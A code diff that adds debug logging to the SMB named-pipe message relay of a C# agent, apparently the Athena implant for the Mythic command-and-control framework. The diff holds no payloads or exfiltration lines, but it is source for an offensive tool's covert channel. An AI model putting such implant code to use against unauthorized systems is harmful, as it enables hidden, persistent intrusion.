@@ -11,6 +11,7 @@ using System.Collections.Generic;
 using Athena.Models;
 using Athena.Models.Config;
 using System.Text.Json;
+using System.Diagnostics;
 
 namespace Athena
 {
@@ -66,27 +67,33 @@ namespace Athena
             this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
             this.serverPipe.MessageReceived += (sender, args) => OnMessageReceive(args);
             this.serverPipe.StartAsync();
+
+            Debug.WriteLine($"[{DateTime.Now}] Started SMB Server. Listening on {this.pipeName}");
         }
 
         private async void OnMessageReceive(ConnectionMessageEventArgs<DelegateMessage> args)
         {
             try
             {
+                Debug.WriteLine($"[{DateTime.Now}] Message received from pipe {args.Message.message.Length} bytes");
                 //Add message to out queue.
                 if (this.partialMessages.ContainsKey(args.Message.uuid))
                 {
                     if (args.Message.final)
                     {
+                        Debug.WriteLine($"[{DateTime.Now}] Final message received.");
                         string curMessage = args.Message.message;
 
                         args.Message.message = this.partialMessages[args.Message.uuid] + curMessage;
                         this.queueIn.Add(args.Message);
 
                         this.partialMessages.Remove(args.Message.uuid, out _);
+                        Debug.WriteLine($"[{DateTime.Now}] Setting Event Happened Signal.");
                         onEventHappenedSignal.Set(); //Indicate something happened
                     }
                     else //Not Last Message but we already have a value in the partial messages
                     {
+                        Debug.WriteLine($"[{DateTime.Now}] Appending message to existing tracker.");
                         this.partialMessages[args.Message.uuid] += args.Message.message;
                     }
                 }
@@ -94,28 +101,33 @@ namespace Athena
                 {
                     if (args.Message.final)
                     {
+                        Debug.WriteLine($"[{DateTime.Now}] Message doesn't need to be chunked, setting Event Happened Signal.");
                         this.queueIn.Add(args.Message);
                         onEventHappenedSignal.Set(); //Indicate something happened
                     }
                     else
                     {
+                        Debug.WriteLine($"[{DateTime.Now}] New message received, adding to tracker.");
                         this.partialMessages.GetOrAdd(args.Message.uuid, args.Message.message); //Add value to our Collection
                     }
                 }
             }
             catch (Exception e)
             {
+                Debug.WriteLine($"[{DateTime.Now}] {e}");
             }
         }
 
         public async Task OnClientConnection()
         {
+            Debug.WriteLine($"[{DateTime.Now}] New Client Connected!");
             onClientConnectedSignal.Set();
             this.connected = true;
         }
 
         public async Task OnClientDisconnect()
         {
+            Debug.WriteLine($"[{DateTime.Now}] Client Disconnected.");
             this.connected = false;
             onEventHappenedSignal.Set(); //Indicate something happened
             onClientConnectedSignal.Reset();
@@ -168,18 +180,23 @@ namespace Athena
                             final = false
                         };
                     }
+
+                    Debug.WriteLine($"[{DateTime.Now}] Writing Delegate Part to pipe.");
                     await this.serverPipe.WriteAsync(dm);
                 }
 
                 //Wait for a signal
+                Debug.WriteLine($"[{DateTime.Now}] Waiting for full response from Mythic.");
                 onEventHappenedSignal.WaitOne();
                 if (!connected) //Our event was a client disconnect
                 {
+                    Debug.WriteLine($"[{DateTime.Now}] Lost connection to client. Restarting loop.");
                     onEventHappenedSignal.Reset(); //Reset the event and return empty
                     return String.Empty;
                 }
                 else //Our event was a new message
                 {
+                    Debug.WriteLine($"[{DateTime.Now}] Received new message!");
                     if (this.queueIn.Count > 0) //Check if we actually got a message
                     {
                         dm = this.queueIn.Take(); //Take a value from it
